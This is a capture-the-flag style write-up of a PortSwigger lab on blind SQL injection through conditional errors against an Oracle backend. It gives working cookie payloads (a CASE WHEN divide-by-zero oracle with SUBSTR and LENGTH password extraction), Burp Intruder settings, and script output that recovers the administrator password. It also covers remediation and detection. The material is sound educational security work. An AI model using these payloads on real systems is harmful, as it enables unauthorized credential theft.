# Blind SQL Injection via Conditional Errors — Lab Writeup

**Platform:** PortSwigger Web Security Academy
**Lab:** Blind SQL injection with conditional errors
**Difficulty:** Practitioner
**Date:** 2026-10-31 – 2026-11-01
**Tools:** Burp Suite Community Edition v2026.9 (Proxy, Repeater, Intruder), Python 3 (custom extraction script)
**Status:** Solved

---

## 1. Summary

The target application sets a `TrackingId` cookie that is embedded, unsanitized, into a server-side SQL query. Unlike the earlier conditional-**response** lab, this application gives **no visible content difference** between a `TRUE` and `FALSE` injected condition — the only observable signal is whether the query throws an **unhandled database error** (HTTP `500`) or completes normally (HTTP `200`).

This is a **boolean-based blind SQL injection exploited via conditional errors**: a `CASE WHEN` expression was used to deliberately trigger a divide-by-zero error only when the injected condition evaluates to `TRUE`, turning the presence/absence of a `500` response into a one-bit oracle. The backend was fingerprinted as **Oracle** from its syntax dialect. The technique was used to confirm the `administrator` account, determine the password length, and extract the password character by character — first manually in Repeater/Intruder, then via a custom Python script once the manual Intruder workflow became slow to iterate on.

---

## 2. Finding Details

| Field | Value |
|---|---|
| **Title** | Boolean-based Blind SQL Injection via `TrackingId` cookie (error-based oracle) |
| **Severity** | High (CVSS 3.1: 8.6 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`) |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |
| **OWASP Top 10** | A03:2021 — Injection |
| **Affected endpoint** | `GET /` |
| **Affected parameter** | `TrackingId` cookie |
| **Database engine** | Oracle (confirmed via `dual`, `rownum`, `TO_CHAR()`, `||` concatenation) |
| **Database objects involved** | `users` table; `username`, `password` columns |

---

## 3. Reconnaissance & Hypothesis

The PortSwigger Academy material preceding this lab explains that some applications behave identically regardless of whether an injected boolean condition is true or false — so the conditional-**response** technique used in the previous lab doesn't apply. Instead, the hint is to force the database to throw an error only when the condition is true, using a `CASE` expression such as:

```sql
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'
```

If an unhandled error changes the HTTP response (status code, length, or body), that difference becomes the oracle.

**Hypothesis:** the `TrackingId` cookie is concatenated into a backend query exactly as in the prior lab, but this application's query execution context surfaces unhandled SQL errors as a distinct HTTP response (expected: `500 Internal Server Error`) that can be used as the TRUE/FALSE signal.

---

## 4. Reproduction Steps

### Step 1 — Confirm the injection point and syntax dialect

Sent the baseline request to Repeater and began probing the cookie:

```
Cookie: TrackingId=tb3cMFeDn4kllX6q'; session=...
```
→ `500 Internal Server Error` (broken SQL syntax — single quote not closed).

```
Cookie: TrackingId=tb3cMFeDn4kllX6q''; session=...
```
→ `200 OK` (doubled quote is valid, closing + reopening the string).

Built out a safe injection scaffold using string concatenation so the surrounding query stays syntactically valid regardless of payload:

```
Cookie: TrackingId=tb3cMFeDn4kllX6q' || (SELECT '') || ''; session=...
```
→ `200 OK` — confirms string concatenation syntax works.

```
Cookie: TrackingId=tb3cMFeDn4kllX6q' || (SELECT '' FROM dualfacefuss) || ''; session=...
```
→ `500 Internal Server Error` — referencing a non-existent table throws an error, confirming subqueries are evaluated and errors surface as `500`.

```
Cookie: TrackingId=tb3cMFeDn4kllX6q' || (SELECT '' FROM users WHERE rownum=1) || ''; session=...
```
→ `200 OK` — confirms the `users` table exists **and** that `ROWNUM` is a valid pseudo-column. Combined with the `||` concatenation operator used throughout, this fingerprints the backend as **Oracle**.

### Step 2 — Build and confirm the conditional-error oracle

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ''
```
→ `500 Internal Server Error` — `1=1` is true, so `TO_CHAR(1/0)` executes and throws a divide-by-zero error.

```sql
' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ''
```
→ `200 OK` — `1=2` is false, the `ELSE` branch (an empty string) is returned, no error.

**Confirmed oracle:**

| Condition | HTTP status | Interpretation |
|---|---|---|
| `TRUE` | `500` | Divide-by-zero triggered |
| `FALSE` | `200` | No error |

### Step 3 — Confirm the administrator account

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || ''
```
→ `500 Internal Server Error` — confirms a row with `username = 'administrator'` exists.

### Step 4 — Determine password length

Query template:

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>§N§) || ''
```

Manually confirmed in Repeater:
- `LENGTH(password)>1` → `500` (TRUE)
- `LENGTH(password)>20` → `200` (FALSE)

Automated with **Burp Intruder — Sniper attack**, `N` = Numbers payload, 0–20. Results: `500` status for every request from `N=0` through `N=19`, flipping to `200` at `N=20`.

**Conclusion: `LENGTH(password) = 20`.**

### Step 5 — Extract the password character by character

Query template:

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,§1§,1)='§a§') || ''
```

Configured **Burp Intruder — Cluster bomb attack**:

| Position | Payload type | Payload set |
|---|---|---|
| Position 1 (character index) | Numbers | 1–20, step 1 |
| Position 2 (character guess) | Brute forcer | `abcdefghijklmnopqrstuvwxyz0123456789`, length 1 (36 values) |

Total: 20 × 36 = **720 requests**. For each position, the single payload that returned `500` (instead of the baseline `200`) identified the correct character at that index.

**Note on manual pace:** working through 20 positions × 36 candidates by eye in the Intruder results grid, combined with the lab instance resetting/rotating its `TrackingId` and session cookies on refresh, made the fully manual approach slow and error-prone — several partial runs had to be discarded and restarted against a fresh cookie pair.

### Step 6 — Automate extraction with a Python script

To finish reliably, the same conditional-error oracle was reimplemented in a standalone Python script (`blind_sqli.py`) that:
1. Takes the target URL and a live session cookie as input
2. Iterates character positions `1–20`
3. For each position, brute-forces the candidate character set, sending the `SUBSTR(password,<pos>,1)='<char>'` payload wrapped in the `CASE WHEN ... TO_CHAR(1/0)` oracle
4. Treats an HTTP `500` response as a positive match, immediately moves to the next position, and prints progress live (`Character N found: 'x' | Current Password string: ...`)
5. Prints the final recovered password on completion

Running the script against a fresh lab instance reconstructed the full 20-character password end-to-end without manual intervention:

```
[*] Initiating conditional error extraction loop...
[+] Character 1 found: 'w' | Current Password string: w
[+] Character 2 found: '4' | Current Password string: w4
...
[+] Character 20 found: 'i' | Current Password string: w4vk30jkehpnplgjctwi
[+] SUCCESS! Extracted Administrator Password: w4vk30jkehpnplgjc[REDACTED]
```

### Step 7 — Log in and confirm solve

Logged in at `/login` with:
- **Username:** `administrator`
- **Password:** *(20-character value recovered by the script above)*

`/my-account` displayed `"Your username is: administrator"` and the lab banner flipped to:

> **Congratulations, you solved the lab!**

---

## 5. Proof of Concept

**Final confirmed oracle payload template:**

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,<pos>,1)='<char>') || ''
```

**Evidence of oracle behavior:**

| Condition | HTTP status | Interpretation |
|---|---|---|
| `CASE WHEN (1=1) THEN TO_CHAR(1/0) ...` | `500` | TRUE |
| `CASE WHEN (1=2) THEN TO_CHAR(1/0) ...` | `200` | FALSE |
| `SELECT '' FROM dualfacefuss` (nonexistent table) | `500` | Error / fingerprinting |
| `SELECT '' FROM users WHERE rownum=1` | `200` | Confirms Oracle dialect |

**Final result:** Login as `administrator` succeeded with the password extracted by the automated script; lab state changed to `Solved`.

---

## 6. Impact

Identical in substance to the conditional-response variant — full credential extraction without any output ever rendered on the page — but notably **harder to spot in logs that only watch for suspicious page content**, since every signal here is a server error code. In production:

- Unauthenticated, full extraction of any column from any accessible table, including credentials, tokens, or PII
- Oracle-specific side effects are possible beyond pure extraction (e.g., abusing other built-in functions reachable from the same injection point)
- Repeated `500` responses from this technique are a **detectable artifact** server-side (elevated error rate on one endpoint tied to one cookie value) — but only if error-rate monitoring exists and is tuned to catch it

---

## 7. Root Cause

Same root cause as the conditional-response lab: the `TrackingId` cookie is concatenated directly into a SQL query without parameterization. The only difference exploited here is how the *application framework* surfaces an unhandled database exception (as a distinct `500` response) rather than suppressing it.

---

## 8. Remediation

**Primary fix — parameterized queries:**

```python
# Vulnerable
query = f"SELECT * FROM analytics WHERE tracking_id = '{tracking_id}'"

# Fixed
query = "SELECT * FROM analytics WHERE tracking_id = :1"
cursor.execute(query, [tracking_id])
```

**Defense in depth:**
- Catch and generically handle all database exceptions server-side so internal errors never produce a distinguishable HTTP response (same status/length/body regardless of cause)
- Least-privilege database account for this query context
- Input validation on the `TrackingId` cookie format
- Alert on abnormal spikes of `500` responses scoped to a single session/cookie/IP — this is a strong indicator of exactly this attack pattern
- WAF rule as a secondary control for common SQLi tokens (`CASE WHEN`, `1/0`, `TO_CHAR`, `SUBSTR`, `||`)

---

## 9. Failed Attempts & Lessons Learned

- The lab's standard `' AND 1=1--` / `' AND 1=2--` conditional-**response** probe (from the previous lab) produced **no visible difference** here — that negative result was the actual signal to pivot to a conditional-**error** approach, not a dead end.
- An early payload (`' || (SELECT '') || '`) without a `FROM` clause failed before the `FROM dual` form was tried — Oracle requires every `SELECT` to reference a table, unlike MySQL/Postgres, which was a useful confirmation of the backend engine on its own.
- Querying a deliberately nonexistent table (`dualfacefuss`) was a quick, cheap way to confirm that subquery errors really do propagate to a `500` response, before investing time in the `CASE WHEN` payload.
- **Manual Intruder cluster-bombing across 720 requests, combined with the lab environment rotating `TrackingId`/session cookies on every refresh, caused multiple partial extraction runs to go stale mid-attack** — several in-progress attacks had to be abandoned when the cookie pair being targeted no longer matched the live lab session. This repeated friction is what motivated writing a standalone Python script: scripting the request/response cycle directly against a single freshly-copied session made the extraction atomic and repeatable, rather than depending on an Intruder attack staying valid for the several minutes a 720-request cluster bomb takes to review by eye.
- Worth building the script as reusable tooling going forward — it generalizes directly to other `SUBSTR`/`CASE WHEN`-style blind extraction scenarios with only the oracle condition and target column needing to change.

---

## 10. References

- CWE-89: [https://cwe.mitre.org/data/definitions/89.html](https://cwe.mitre.org/data/definitions/89.html)
- OWASP SQL Injection Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- PortSwigger Web Security Academy — Exploiting blind SQL injection by triggering conditional errors: [https://portswigger.net/web-security/sql-injection/blind](https://portswigger.net/web-security/sql-injection/blind)
